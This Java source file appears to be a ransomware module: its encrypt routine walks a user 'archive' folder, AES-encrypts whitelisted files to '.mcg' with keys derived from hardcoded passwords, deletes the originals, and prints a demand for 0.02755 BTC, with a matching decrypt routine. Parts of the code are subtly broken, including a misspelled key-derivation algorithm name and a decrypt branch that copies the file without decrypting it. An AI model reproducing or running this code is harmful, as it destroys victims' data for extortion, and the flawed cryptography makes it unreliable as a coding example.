import javax.crypto.*;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.sound.sampled.*;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.spec.KeySpec;

public class AES256{

    private static final AES256 instance = new AES256();

    public Port port;

    private AES256(){
        port = new Port();
    }

    public static AES256 getInstance() {
        return instance;
    }

    private static final String pw1 = "test1";
    private static final String pw2 = "test2";

    private static String bytesToHex(byte[] hash){
        StringBuilder hexString = new StringBuilder(2 * hash.length);

        for(int i = 0; i < hash.length; i++){
            String hex = Integer.toHexString(0xff & hash[i]);
            if(hex.length() == 1){
                hexString.append('0');
            }
            hexString.append(hex);
        }

        return hexString.toString();

    }


    private static void d_encrypt(int cipherMode, File inputFile, File outputFile){
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");

            byte[] encodedpw1 = digest.digest(pw1.getBytes(StandardCharsets.UTF_8));
            String hashpw1 = bytesToHex(encodedpw1);

            byte[] encodedpw2 = digest.digest(pw2.getBytes(StandardCharsets.UTF_8));
            String hashpw2 = bytesToHex(encodedpw2);

            File file;
            FileInputStream fileInputStream = new FileInputStream(inputFile);
            FileOutputStream fileOutputStream = new FileOutputStream(outputFile);

            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHAA256");
            KeySpec spec = new PBEKeySpec(hashpw1.toCharArray(), hashpw2.getBytes(), 65536, 256);

            SecretKey tmp = factory.generateSecret(spec);
            SecretKeySpec secretKey = new SecretKeySpec(tmp.getEncoded(), "AES");
            Cipher cipher = Cipher.getInstance("AES");

            if(cipherMode == Cipher.ENCRYPT_MODE){

                cipher.init(Cipher.ENCRYPT_MODE, secretKey);
                CipherInputStream cipherInputStream = new CipherInputStream(fileInputStream, cipher);
                write(cipherInputStream, fileOutputStream);

            }else if(cipherMode == Cipher.DECRYPT_MODE){
                cipher.init(Cipher.DECRYPT_MODE, secretKey);
                CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, cipher);
                write(fileInputStream, fileOutputStream);
            }

            fileInputStream.close();
            fileOutputStream.close();


        }catch (Exception e){
            System.out.println("Encoding Error: " + e);
        }
    }


    public static void write(InputStream inputStream, OutputStream outputStream) throws IOException {

        byte[] bufferArray = new byte[64];
        int input;

        while ((input = inputStream.read(bufferArray)) != -1){
            outputStream.write(bufferArray, 0, input);
        }

        outputStream.close();
        inputStream.close();



    }


    public class Port implements IAES256{


        private static final File f = new File(Configuration.instance.userDirectory + Configuration.instance.fileSeperator + "archive");

        @Override
        public void encrypt() {

            WhiteList.resetList();
            File[] fileArray = f.listFiles();

            if(fileArray != null){
                for (File file : fileArray){
                    if(WhiteList.whiteListEn(file)){
                        try{
                            File encrypted = new File(file.toString().concat(".mcg"));
                            d_encrypt(Cipher.ENCRYPT_MODE, file, encrypted);
                            System.out.println("Encryption Completed!");
                        }catch (Exception e){
                            e.printStackTrace();
                        }

                        try{
                            if(file.delete()){
                                System.out.println(file + " has been deleted");
                            }else{
                                System.out.println(file + " failed deleting");
                            }
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                    }
                }
                System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
            }else {
                System.out.println("NO FILES FOUND TO ENCRYPT. YOU ARE LUCKY");
            }
        }

        @Override
        public void decrypt() {

            WhiteList.resetList();
            File[] fileArray = f.listFiles();

            if(fileArray != null){
                for(File file : fileArray){
                    if(WhiteList.whiteListDec(file)){
                        if(file.toString().indexOf(".") > 0){
                            String fileWithoutExt = file.toString().substring(0, file.toString().lastIndexOf("."));
                            try{
                                File decrypted = new File(fileWithoutExt);
                                d_encrypt(Cipher.DECRYPT_MODE, file, decrypted);
                                System.out.println("Decryption Completed!");
                            }catch (Exception e){
                                e.printStackTrace();
                            }

                            try{
                                if(file.delete()){
                                    System.out.println(file + " has been deleted");
                                }else{
                                    System.out.println(file + " failed deleting");
                                }
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
            System.out.println("Your Files were Decrypted!!");
        }
    }
}
